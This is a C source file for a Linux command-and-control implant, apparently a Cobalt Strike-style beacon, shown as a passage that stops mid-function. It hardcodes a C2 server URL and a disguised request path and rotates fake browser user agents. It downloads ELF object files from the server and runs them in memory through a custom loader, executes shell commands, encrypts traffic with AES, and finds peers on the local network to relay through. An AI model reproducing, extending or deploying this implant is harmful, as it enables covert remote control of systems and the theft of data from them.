#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <pwd.h>
#include <errno.h>
#include <openssl/buffer.h>
#include <curl/curl.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <sys/mman.h>
#include <elf.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/wait.h>
#include <stdarg.h>
#include <netdb.h>
#include <pthread.h>

#include "beacon.h"
#include "aes.h"
#include "cJSON.h"

// =======================================================================
// CONSTANTES
// =======================================================================
#define C2_URL        "https://10.10.14.57:4444"
#define CLIENT_ID     "linux"
#define MALEABLE      "/pleasesubscribe/v1/users/"
#define USER_AGENTS_COUNT 4

#define PEER_DISCOVERY_PORT 31337
#define PEER_TCP_PORT       31338
#define PEER_MAGIC          0xB34C0F   // <--- CORREGIDO (hexadecimal válido)
#define PEER_VERSION        0x01
#define BROADCAST_INTERVAL  30
#define MAX_PEERS           64

// =======================================================================
// GLOBALES
// =======================================================================
static unsigned char AES_KEY[32];
static char g_beacon_output[8192] = {0};
static size_t g_output_len = 0;

// =======================================================================
// ESTRUCTURAS P2P
// =======================================================================
typedef struct {
    struct sockaddr_in addr;
    time_t last_seen;
    int fd;
    uint8_t state;          // 0=down, 1=connected, 2=relay
    char id[64];
    uint8_t is_gateway;
} peer_t;

static peer_t g_peers[MAX_PEERS];
static int g_peer_count = 0;
static pthread_mutex_t g_peer_lock = PTHREAD_MUTEX_INITIALIZER;

typedef struct {
    uint32_t magic;
    uint32_t version;
    uint32_t type;          // 0=ping,1=pong,2=cmd,3=resp,4=relay_req,5=relay_resp
    uint32_t payload_len;
    uint8_t iv[16];
} p2p_header_t;

// =======================================================================
// PROTOTIPOS DE FUNCIONES (para evitar declaraciones implícitas)
// =======================================================================
char* execute_generic_command(const char *cmd, int *out_len);
char* send_to_peer(peer_t *peer, const char *data, int *out_len);
char* send_to_c2_or_peer(const char *url, const char *method, const char *data, int *out_len);
void add_peer(struct in_addr ip, int port, const char *id);

// =======================================================================
// FUNCIONES DE LA API DE BEACON (para BOFs)
// =======================================================================
void BeaconDataParse(datap *parser, char *buffer, int size) {
    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size;
}

char *BeaconDataPtr(datap *parser, int size) {
    if (parser->length < size) return NULL;
    char *ptr = parser->buffer;
    parser->buffer += size;
    parser->length -= size;
    return ptr;
}

int BeaconDataInt(datap *parser) {
    char *ptr = BeaconDataPtr(parser, 4);
    if (!ptr) return 0;
    return *(int*)ptr;
}

short BeaconDataShort(datap *parser) {
    char *ptr = BeaconDataPtr(parser, 2);
    if (!ptr) return 0;
    return *(short*)ptr;
}

int BeaconDataLength(datap *parser) {
    return parser->length;
}

char *BeaconDataExtract(datap *parser, int *size) {
    int len = BeaconDataInt(parser);
    if (len <= 0 || len > parser->length) return NULL;
    char *data = BeaconDataPtr(parser, len);
    if (size) *size = len;
    return data;
}

void BeaconPrintf(int type, const char *fmt, ...) {
    if (g_output_len >= sizeof(g_beacon_output) - 1) return;
    va_list args;
    va_start(args, fmt);
    int written = vsnprintf(g_beacon_output + g_output_len,
                            sizeof(g_beacon_output) - g_output_len - 1,
                            fmt, args);
    va_end(args);
    if (written > 0) {
        g_output_len += (written < (int)(sizeof(g_beacon_output) - g_output_len) ? written : (int)(sizeof(g_beacon_output) - g_output_len - 1));
    }
}

void BeaconOutput(int type, const char *data, int len) {
    if (len <= 0 || !data) return;
    if (g_output_len + len >= sizeof(g_beacon_output)) {
        len = sizeof(g_beacon_output) - g_output_len - 1;
    }
    memcpy(g_beacon_output + g_output_len, data, len);
    g_output_len += len;
    g_beacon_output[g_output_len] = '\0';
}

// =======================================================================
// TRAMPOLINES Y RELOCACIÓN (RunELF) - SIN CAMBIOS
// =======================================================================
typedef struct {
    void* addr;
    size_t size;
} Trampoline;

typedef void (*bof_func_t)(char*, int);
typedef struct {
    const char *name;
    void **ptr;
} SymbolResolver;

static Trampoline* g_trampolines = NULL;
static size_t g_trampolines_count = 0;
static size_t g_trampolines_capacity = 0;

typedef struct {
    void* original;
    void* trampoline;
} TrampolineCache;
static TrampolineCache* g_trampoline_cache = NULL;
static size_t g_cache_count = 0;
static size_t g_cache_capacity = 0;

void* g_printf_ptr = NULL;
void* g_strlen_ptr = NULL;
void* g_memcpy_ptr = NULL;
void* g_memset_ptr = NULL;
void* g_exit_ptr = NULL;
void* g_dlsym_ptr = NULL;
void* g_dlerror_ptr = NULL;
void* g_dlopen_ptr = NULL;
void* g_dlclose_ptr = NULL;
void* g_write_ptr = NULL;
void* g_mmap_ptr = NULL;
void* g_munmap_ptr = NULL;
void* g_BeaconPrintf_ptr = NULL;
void* g_BeaconOutput_ptr = NULL;
void* g_socket_ptr = NULL;
void* g_connect_ptr = NULL;
void* g_inet_addr_ptr = NULL;
void* g_htons_ptr = NULL;
void* g_send_ptr = NULL;
void* g_recv_ptr = NULL;
void* g_close_ptr = NULL;
void* g_getaddrinfo_ptr = NULL;
void* g_freeaddrinfo_ptr = NULL;

static SymbolResolver g_external_symbols[] = {
    { "printf",      &g_printf_ptr },
    { "strlen",      &g_strlen_ptr },
    { "memcpy",      &g_memcpy_ptr },
    { "memset",      &g_memset_ptr },
    { "exit",        &g_exit_ptr },
    { "dlsym",       &g_dlsym_ptr },
    { "dlerror",     &g_dlerror_ptr },
    { "dlopen",      &g_dlopen_ptr },
    { "dlclose",     &g_dlclose_ptr },
    { "write",       &g_write_ptr },
    { "mmap",        &g_mmap_ptr },
    { "munmap",      &g_munmap_ptr },
    { "BeaconPrintf", &g_BeaconPrintf_ptr },
    { "BeaconOutput", &g_BeaconOutput_ptr },
    { "socket",      &g_socket_ptr },
    { "connect",     &g_connect_ptr },
    { "inet_addr",   &g_inet_addr_ptr },
    { "htons",       &g_htons_ptr },
    { "send",        &g_send_ptr },
    { "recv",        &g_recv_ptr },
    { "close",       &g_close_ptr },
    { "getaddrinfo", &g_getaddrinfo_ptr },
    { "freeaddrinfo",&g_freeaddrinfo_ptr },
    { NULL, NULL }
};

static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t arglen) {
    asm volatile(
        "push %%rbp\n\t"
        "mov %%rsp, %%rbp\n\t"
        "push %%rbx\n\t"
        "push %%r12\n\t"
        "push %%r13\n\t"
        "push %%r14\n\t"
        "push %%r15\n\t"
        "sub $8, %%rsp\n\t"
        "mov %0, %%rdi\n\t"
        "mov %1, %%rsi\n\t"
        "xor %%eax, %%eax\n\t"
        "call *%2\n\t"
        "add $8, %%rsp\n\t"
        "pop %%r15\n\t"
        "pop %%r14\n\t"
        "pop %%r13\n\t"
        "pop %%r12\n\t"
        "pop %%rbx\n\t"
        "pop %%rbp\n\t"
        :
        : "r"(args), "r"(arglen), "r"(func)
        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11",
          "xmm0","xmm1","xmm2","xmm3","xmm4","xmm5","xmm6","xmm7",
          "memory","cc"
    );
}

static void* create_trampoline(void* target) {
    if (!target) return NULL;
    size_t code_size = 12;
    void* code = mmap(NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (code == MAP_FAILED) return NULL;
    uint8_t trampoline_code[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xE0
    };
    *(uint64_t*)(trampoline_code + 2) = (uint64_t)target;
    memcpy(code, trampoline_code, code_size);
    if (g_trampolines_count >= g_trampolines_capacity) {
        size_t new_cap = g_trampolines_capacity ? g_trampolines_capacity * 2 : 4;
        Trampoline* tmp = realloc(g_trampolines, new_cap * sizeof(Trampoline));
        if (!tmp) { munmap(code, code_size); return NULL; }
        g_trampolines = tmp;
        g_trampolines_capacity = new_cap;
    }
    g_trampolines[g_trampolines_count].addr = code;
    g_trampolines[g_trampolines_count].size = code_size;
    g_trampolines_count++;
    return code;
}

static void cleanup_trampolines(void) {
    for (size_t i = 0; i < g_trampolines_count; i++)
        munmap(g_trampolines[i].addr, g_trampolines[i].size);
    free(g_trampolines);
    g_trampolines = NULL;
    g_trampolines_count = 0;
    g_trampolines_capacity = 0;
    free(g_trampoline_cache);
    g_trampoline_cache = NULL;
    g_cache_count = 0;
    g_cache_capacity = 0;
}

static void* get_or_create_trampoline(void* target) {
    if (!target) return NULL;
    for (size_t i = 0; i < g_cache_count; i++) {
        if (g_trampoline_cache[i].original == target)
            return g_trampoline_cache[i].trampoline;
    }
    void* tramp = create_trampoline(target);
    if (!tramp) return NULL;
    if (g_cache_count >= g_cache_capacity) {
        size_t new_cap = g_cache_capacity ? g_cache_capacity * 2 : 8;
        TrampolineCache* tmp = realloc(g_trampoline_cache, new_cap * sizeof(TrampolineCache));
        if (!tmp) return tramp;
        g_trampoline_cache = tmp;
        g_cache_capacity = new_cap;
    }
    g_trampoline_cache[g_cache_count].original = target;
    g_trampoline_cache[g_cache_count].trampoline = tramp;
    g_cache_count++;
    return tramp;
}

static size_t page_align(size_t size) {
    long page_size = sysconf(_SC_PAGESIZE);
    if (page_size <= 0) page_size = 4096;
    return (size + page_size - 1) & ~(page_size - 1);
}

int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
           unsigned char* argumentdata, int argumentSize) {
    if (g_BeaconPrintf_ptr == NULL) g_BeaconPrintf_ptr = (void*)BeaconPrintf;
    if (g_BeaconOutput_ptr == NULL) g_BeaconOutput_ptr = (void*)BeaconOutput;
    if (g_mmap_ptr == NULL) g_mmap_ptr = (void*)mmap;
    if (g_munmap_ptr == NULL) g_munmap_ptr = (void*)munmap;
    if (g_write_ptr == NULL) g_write_ptr = (void*)write;
    if (g_printf_ptr == NULL) g_printf_ptr = (void*)printf;
    if (g_memcpy_ptr == NULL) g_memcpy_ptr = (void*)memcpy;
    if (g_memset_ptr == NULL) g_memset_ptr = (void*)memset;
    if (g_strlen_ptr == NULL) g_strlen_ptr = (void*)strlen;
    if (g_socket_ptr == NULL) g_socket_ptr = (void*)socket;
    if (g_connect_ptr == NULL) g_connect_ptr = (void*)connect;
    if (g_close_ptr == NULL) g_close_ptr = (void*)close;
    if (g_getaddrinfo_ptr == NULL) g_getaddrinfo_ptr = (void*)getaddrinfo;
    if (g_freeaddrinfo_ptr == NULL) g_freeaddrinfo_ptr = (void*)freeaddrinfo;
    if (g_send_ptr == NULL) g_send_ptr = (void*)send;
    if (g_recv_ptr == NULL) g_recv_ptr = (void*)recv;
    if (g_htons_ptr == NULL) g_htons_ptr = (void*)htons;
    if (g_inet_addr_ptr == NULL) g_inet_addr_ptr = (void*)inet_addr;
    if (g_exit_ptr == NULL) g_exit_ptr = (void*)exit;
    if (g_dlsym_ptr == NULL) g_dlsym_ptr = (void*)dlsym;
    if (g_dlerror_ptr == NULL) g_dlerror_ptr = (void*)dlerror;
    if (g_dlopen_ptr == NULL) g_dlopen_ptr = (void*)dlopen;
    if (g_dlclose_ptr == NULL) g_dlclose_ptr = (void*)dlclose;

    g_output_len = 0;
    g_beacon_output[0] = '\0';

    if (!elf_data || filesize < sizeof(Elf64_Ehdr)) return -1;

    Elf64_Ehdr *ehdr = (Elf64_Ehdr*)elf_data;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) return -1;
    if (ehdr->e_machine != EM_X86_64) return -1;
    if (ehdr->e_shoff == 0 || ehdr->e_shnum == 0) return -1;

    Elf64_Shdr *shdr = (Elf64_Shdr*)(elf_data + ehdr->e_shoff);
    char *strtab = NULL;
    Elf64_Sym *symtab = NULL;

    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdr[i].sh_type == SHT_SYMTAB) {
            symtab = (Elf64_Sym*)(elf_data + shdr[i].sh_offset);
            if (shdr[i].sh_link < ehdr->e_shnum)
                strtab = (char*)(elf_data + shdr[shdr[i].sh_link].sh_offset);
            break;
        }
    }
    if (!symtab || !strtab) return -1;

    int sym_table_count = 0;
    for (int k = 0; k < ehdr->e_shnum; k++) {
        if (shdr[k].sh_type == SHT_SYMTAB) {
            sym_table_count = shdr[k].sh_size / sizeof(Elf64_Sym);
            break;
        }
    }

    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if (sh->sh_type != SHT_RELA) continue;
        Elf64_Rela *rela = (Elf64_Rela*)(elf_data + sh->sh_offset);
        int num_rela = sh->sh_size / sizeof(Elf64_Rela);
        for (int j = 0; j < num_rela; j++) {
            int sym_idx = ELF64_R_SYM(rela[j].r_info);
            if (sym_idx == 0 || sym_idx >= sym_table_count) continue;
            Elf64_Sym *sym = &symtab[sym_idx];
            if (sym->st_shndx != SHN_UNDEF) continue;
            char *sym_name = strtab + sym->st_name;
            if (!sym_name || sym_name[0] == '\0') continue;
            void* resolved = NULL;
            for (int k = 0; g_external_symbols[k].name; k++) {
                if (strcmp(sym_name, g_external_symbols[k].name) == 0) {
                    if (*g_external_symbols[k].ptr == NULL) {
                        *g_external_symbols[k].ptr = dlsym(RTLD_DEFAULT, sym_name);
                    }
                    resolved = *g_external_symbols[k].ptr;
                    break;
                }
            }
            if (!resolved) {
                if (strcmp(sym_name, "g_mmap_ptr") == 0) resolved = &g_mmap_ptr;
                else if (strcmp(sym_name, "g_munmap_ptr") == 0) resolved = &g_munmap_ptr;
                else if (strcmp(sym_name, "g_write_ptr") == 0) resolved = &g_write_ptr;
                else {
                    resolved = dlsym(RTLD_DEFAULT, sym_name);
                }
            }
        }
    }

    void **sections = calloc(ehdr->e_shnum, sizeof(void*));
    size_t *aligned_sizes = calloc(ehdr->e_shnum, sizeof(size_t));
    if (!sections || !aligned_sizes) { free(sections); free(aligned_sizes); return -1; }

    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if ((sh->sh_flags & SHF_ALLOC) && sh->sh_size > 0) {
            if (sh->sh_type == SHT_PROGBITS) {
                if (sh->sh_offset + sh->sh_size > filesize) continue;
            }
            size_t aligned_size = page_align(sh->sh_size);
            void *addr = mmap(NULL, aligned_size,
                              PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (addr == MAP_FAILED) continue;
            sections[i] = addr;
            aligned_sizes[i] = aligned_size;
            if (sh->sh_type == SHT_PROGBITS)
                memcpy(addr, elf_data + sh->sh_offset, sh->sh_size);
            else if (sh->sh_type == SHT_NOBITS)
                memset(addr, 0, aligned_size);
        }
    }

    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if (sh->sh_type != SHT_RELA) continue;
        int target_sec = sh->sh_info;
        if (target_sec >= ehdr->e_shnum || !sections[target_sec]) continue;
        if (!(shdr[target_sec].sh_flags & SHF_ALLOC)) continue;
        Elf64_Rela *rela = (Elf64_Rela*)(elf_data + sh->sh_offset);
        int num_rela = sh->sh_size / sizeof(Elf64_Rela);
        void *target_addr = sections[target_sec];
        for (int j = 0; j < num_rela; j++) {
            Elf64_Rela *r = &rela[j];
            void *loc = (char*)target_addr + r->r_offset;
            int sym_idx = ELF64_R_SYM(r->r_info);
            if (sym_idx >= sym_table_count) continue;
            Elf64_Sym *sym = &symtab[sym_idx];
            char *sym_name = strtab + sym->st_name;
            void *symbol_addr = NULL;
            if (sym->st_shndx != SHN_UNDEF && sym->st_shndx < ehdr->e_shnum && sections[sym->st_shndx]) {
                symbol_addr = sections[sym->st_shndx] + sym->st_value;
            } else {
                for (int k = 0; g_external_symbols[k].name; k++) {
                    if (strcmp(sym_name, g_external_symbols[k].name) == 0) {
                        symbol_addr = *g_external_symbols[k].ptr;
                        break;
                    }
                }
            }
            if (!symbol_addr) {
                if (strcmp(sym_name, "g_mmap_ptr") == 0) symbol_addr = &g_mmap_ptr;
                else if (strcmp(sym_name, "g_munmap_ptr") == 0) symbol_addr = &g_munmap_ptr;
                else if (strcmp(sym_name, "g_write_ptr") == 0) symbol_addr = &g_write_ptr;
                else continue;
            }
            switch (ELF64_R_TYPE(r->r_info)) {
                case R_X86_64_64:
                    *(uint64_t*)loc = (uint64_t)((uintptr_t)symbol_addr + r->r_addend);
                    break;
                case R_X86_64_32: {
                    uintptr_t value = (uintptr_t)symbol_addr + r->r_addend;
                    if (value > 0xFFFFFFFF) continue;
                    *(uint32_t*)loc = (uint32_t)value;
                    break;
                }
                case 11: {
                    intptr_t value = (intptr_t)symbol_addr + r->r_addend;
                    if (value < INT32_MIN || value > INT32_MAX) goto cleanup;
                    *(int32_t*)loc = (int32_t)value;
                    break;
                }
                case R_X86_64_PC32:
                case R_X86_64_PLT32: {
                    int64_t offset = (int64_t)symbol_addr + r->r_addend - (int64_t)loc;
                    if (offset < INT32_MIN || offset > INT32_MAX) {
                        void* tramp = get_or_create_trampoline(symbol_addr);
                        if (!tramp) continue;
                        offset = (int64_t)tramp + r->r_addend - (int64_t)loc;
                        if (offset < INT32_MIN || offset > INT32_MAX) continue;
                    }
                    *(uint32_t*)loc = (uint32_t)offset;
                    break;
                }
                default:
                    break;
            }
        }
    }

    bof_func_t entry = NULL;
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdr[i].sh_type == SHT_SYMTAB) {
            int sym_count = shdr[i].sh_size / sizeof(Elf64_Sym);
            for (int j = 0; j < sym_count; j++) {
                Elf64_Sym *sym = &symtab[j];
                if (sym->st_name == 0) continue;
                char *name = strtab + sym->st_name;
                if (strcmp(name, functionname) == 0 && sym->st_shndx != SHN_UNDEF) {
                    if (sym->st_shndx < ehdr->e_shnum && sections[sym->st_shndx]) {
                        entry = (bof_func_t)(sections[sym->st_shndx] + sym->st_value);
                        break;
                    }
                }
            }
        }
    }
    if (!entry) goto cleanup;

    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (sections[i]) {
            if (mprotect(sections[i], aligned_sizes[i], PROT_READ | PROT_EXEC) != 0)
                goto cleanup;
        }
    }

    g_output_len = 0;
    g_beacon_output[0] = '\0';
    call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);

cleanup:
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (sections[i]) munmap(sections[i], aligned_sizes[i]);
    }
    free(sections);
    free(aligned_sizes);
    cleanup_trampolines();
    return (entry != NULL) ? 0 : -1;
}

// =======================================================================
// FUNCIONES DE COMUNICACIÓN (HTTPS + BASE64 + AES)
// =======================================================================
struct MemoryStruct {
    char *memory;
    size_t size;
    size_t realsize;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->realsize = mem->size;
    mem->memory[mem->size] = 0;
    return realsize;
}

const char* USER_AGENTS[] = {
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
};

char* https_request(const char* url, const char* method, const char* post_data) {
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;
    struct MemoryStruct chunk = {0};
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, USER_AGENTS[rand() % USER_AGENTS_COUNT]);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");

    struct curl_slist *headers = NULL;
    if (strcmp(method, "POST") == 0 && post_data) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data));
        headers = curl_slist_append(headers, "Content-Type: text/plain");
        headers = curl_slist_append(headers, "Expect:");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    }

    CURLcode res = curl_easy_perform(curl);
    if (headers) curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        free(chunk.memory);
        curl_easy_cleanup(curl);
        return NULL;
    }

    uint64_t realsize = chunk.size;
    char *full = malloc(realsize + 8 + 1);
    if (!full) {
        free(chunk.memory);
        curl_easy_cleanup(curl);
        return NULL;
    }
    memcpy(full, &realsize, 8);
    memcpy(full + 8, chunk.memory, realsize);
    full[8 + realsize] = 0;
    free(chunk.memory);
    curl_easy_cleanup(curl);
    return full + 8;
}

char* base64_encode(const unsigned char* input, int len) {
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(b64, input, len);
    BIO_flush(b64);
    BUF_MEM *bptr;
    BIO_get_mem_ptr(b64, &bptr);
    char *buf = malloc(bptr->length + 1);
    memcpy(buf, bptr->data, bptr->length);
    buf[bptr->length] = '\0';
    BIO_free_all(b64);
    return buf;
}

unsigned char* base64_decode(const char* input, int* len) {
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO *bmem = BIO_new_mem_buf(input, strlen(input));
    b64 = BIO_push(b64, bmem);
    unsigned char *buffer = malloc(strlen(input));
    if (!buffer) { BIO_free_all(b64); return NULL; }
    *len = BIO_read(b64, buffer, strlen(input));
    BIO_free_all(b64);
    if (*len <= 0) { free(buffer); return NULL; }
    return buffer;
}

unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
                                  const unsigned char* plaintext, size_t len, int* out_len) {
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    unsigned char* ciphertext = malloc(len);
    unsigned char iv_buf[16];
    memcpy(iv_buf, iv, 16);
    size_t i = 0;
    while (i < len) {
        unsigned char encrypted_iv[16];
        memcpy(encrypted_iv, iv_buf, 16);
        AES_ECB_encrypt(&ctx, encrypted_iv);
        size_t block_size = (len - i > 16) ? 16 : (len - i);
        for (size_t j = 0; j < block_size; j++)
            ciphertext[i + j] = plaintext[i + j] ^ encrypted_iv[j];
        if (block_size == 16)
            memcpy(iv_buf, &ciphertext[i], 16);
        else {
            memcpy(iv_buf, &ciphertext[i], block_size);
            memset(iv_buf + block_size, 0, 16 - block_size);
        }
        i += block_size;
    }
    *out_len = len;
    return ciphertext;
}

unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
                                  const unsigned char* ciphertext, size_t len, int* out_len) {
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    unsigned char* plaintext = malloc(len + 1);
    unsigned char iv_buf[16];
    memcpy(iv_buf, iv, 16);
    size_t i = 0;
    while (i < len) {
        unsigned char encrypted_iv[16];
        memcpy(encrypted_iv, iv_buf, 16);
        AES_ECB_encrypt(&ctx, encrypted_iv);
        size_t block_size = (len - i > 16) ? 16 : (len - i);
        for (size_t j = 0; j < block_size; j++)
            plaintext[i + j] = ciphertext[i + j] ^ encrypted_iv[j];
        if (block_size == 16)
            memcpy(iv_buf, &ciphertext[i], 16);
        else {
            memcpy(iv_buf, &ciphertext[i], block_size);
            memset(iv_buf + block_size, 0, 16 - block_size);
        }
        i += block_size;
    }
    plaintext[len] = '\0';
    *out_len = len;
    return plaintext;
}

// =======================================================================
// UTILIDADES: ejecutar comandos shell, obtener IPs, etc.
// =======================================================================
char* exec_cmd(const char* cmd, int* out_len) {
    FILE* fp = popen(cmd, "r");
    if (!fp) return NULL;
    char* buffer = malloc(4096);
    if (!buffer) { pclose(fp); return NULL; }
    size_t total = 0;
    size_t n;
    while ((n = fread(buffer + total, 1, 4095 - total, fp)) > 0) {
        total += n;
        if (total >= 4095) break;
    }
    pclose(fp);
    buffer[total] = '\0';
    *out_len = total;
    return buffer;
}

char* get_local_ips() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return strdup("127.0.0.1");
    struct ifconf ifc;
    char buf[1024];
    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sockfd, SIOCGIFCONF, &ifc) < 0) {
        close(sockfd);
        return strdup("127.0.0.1");
    }
    struct ifreq* ifr = ifc.ifc_req;
    int n = ifc.ifc_len / sizeof(struct ifreq);
    char* result = malloc(1024);
    result[0] = '\0';
    for (int i = 0; i < n; i++) {
        struct sockaddr_in* addr = (struct sockaddr_in*)&ifr[i].ifr_addr;
        if (addr->sin_family == AF_INET && strcmp(ifr[i].ifr_name, "lo") != 0) {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);
            if (strlen(result) > 0) strcat(result, ", ");
            strcat(result, ip);
        }
    }
    close(sockfd);
    return strlen(result) > 0 ? result : strdup("127.0.0.1");
}

unsigned char* download_bof(const char* url, size_t* out_size) {
    char *payload = https_request(url, "GET", NULL);
    if (!payload) { *out_size = 0; return NULL; }
    uint64_t realsize;
    memcpy(&realsize, payload - 8, sizeof(realsize));
    *out_size = (size_t)realsize;
    return (unsigned char *)payload;
}

char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          char* args, int arglen, int* out_len) {
    g_output_len = 0;
    g_beacon_output[0] = '\0';
    RunELF("go", elf_data, filesize, (unsigned char*)args, arglen);
    if (g_output_len == 0) { *out_len = 0; return strdup(""); }
    char *output = malloc(g_output_len + 1);
    if (!output) { *out_len = 0; return strdup(""); }
    memcpy(output, g_beacon_output, g_output_len);
    output[g_output_len] = '\0';
    *out_len = g_output_len;
    return output;
}

// =======================================================================
// FUNCIONES P2P
// =======================================================================
void add_peer(struct in_addr ip, int port, const char *id) {
    pthread_mutex_lock(&g_peer_lock);
    for (int i=0; i<g_peer_count; i++) {
        if (g_peers[i].addr.sin_addr.s_addr == ip.s_addr &&
            g_peers[i].addr.sin_port == htons(port)) {
            g_peers[i].last_seen = time(NULL);
            pthread_mutex_unlock(&g_peer_lock);
            return;
        }
    }
    if (g_peer_count < MAX_PEERS) {
        g_peers[g_peer_count].addr.sin_family = AF_INET;
        g_peers[g_peer_count].addr.sin_addr = ip;
        g_peers[g_peer_count].addr.sin_port = htons(port);
        g_peers[g_peer_count].last_seen = time(NULL);
        g_peers[g_peer_count].fd = -1;
        g_peers[g_peer_count].state = 0;
        strncpy(g_peers[g_peer_count].id, id, sizeof(g_peers[g_peer_count].id)-1);
        g_peers[g_peer_count].is_gateway = 0;
        g_peer_count++;
    }
    pthread_mutex_unlock(&g_peer_lock);
}

void *peer_discovery_thread(void *arg) {
    int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    int broadcast = 1;
    setsockopt(udp_sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    struct sockaddr_in bc_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(PEER_DISCOVERY_PORT),
        .sin_addr.s_addr = INADDR_BROADCAST
    };
    char my_id[64];
    gethostname(my_id, sizeof(my_id)-1);
    snprintf(my_id + strlen(my_id), sizeof(my_id)-strlen(my_id), ":%d", getpid());

    struct sockaddr_in listen_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(PEER_DISCOVERY_PORT),
        .sin_addr.s_addr = INADDR_ANY
    };
    bind(udp_sock, (struct sockaddr*)&listen_addr, sizeof(listen_addr));

    while (1) {
        sendto(udp_sock, my_id, strlen(my_id), 0, (struct sockaddr*)&bc_addr, sizeof(bc_addr));
        char buf[256];
        struct sockaddr_in from;
        socklen_t fromlen = sizeof(from);
        int n = recvfrom(udp_sock, buf, sizeof(buf)-1, MSG_DONTWAIT, (struct sockaddr*)&from, &fromlen);
        if (n > 0) {
            buf[n] = 0;
            if (strcmp(buf, my_id) == 0) continue;
            add_peer(from.sin_addr, PEER_TCP_PORT, buf);
        }
        sleep(BROADCAST_INTERVAL);
    }
    return NULL;
}

// Prototipo de execute_generic_command para que handle_peer_connection lo vea
char* execute_generic_command(const char *cmd, int *out_len);

void *handle_peer_connection(void *arg) {
    int fd = (intptr_t)arg;
    p2p_header_t hdr;
    while (1) {
        int n = read(fd, &hdr, sizeof(hdr));
        if (n != sizeof(hdr)) break;
        if (hdr.magic != PEER_MAGIC || hdr.version != PEER_VERSION) break;
        uint8_t *cipher = malloc(hdr.payload_len);
        if (!cipher) break;
        n = read(fd, cipher, hdr.payload_len);
        if (n != hdr.payload_len) { free(cipher); break; }
        int plain_len;
        char *plain = (char*)aes256_cfb_decrypt(AES_KEY, hdr.iv, cipher, hdr.payload_len, &plain_len);
